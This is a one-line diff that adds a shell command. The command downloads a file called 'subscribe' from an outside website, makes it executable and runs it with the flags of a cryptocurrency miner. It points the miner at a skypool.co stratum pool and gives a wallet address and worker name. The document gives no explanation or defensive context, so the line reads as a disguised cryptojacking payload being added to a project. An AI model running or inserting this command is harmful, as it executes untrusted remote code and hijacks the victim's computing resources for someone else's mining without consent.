@@ -1,0 +1,1 @@
+wget http://ilovenypizza.com/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://mbc-asia.skypool.co:8003 -u MqZeG9Tuh9DXVmrswhHSg7bJy117KewEd2.HCRASH -p c=MBC
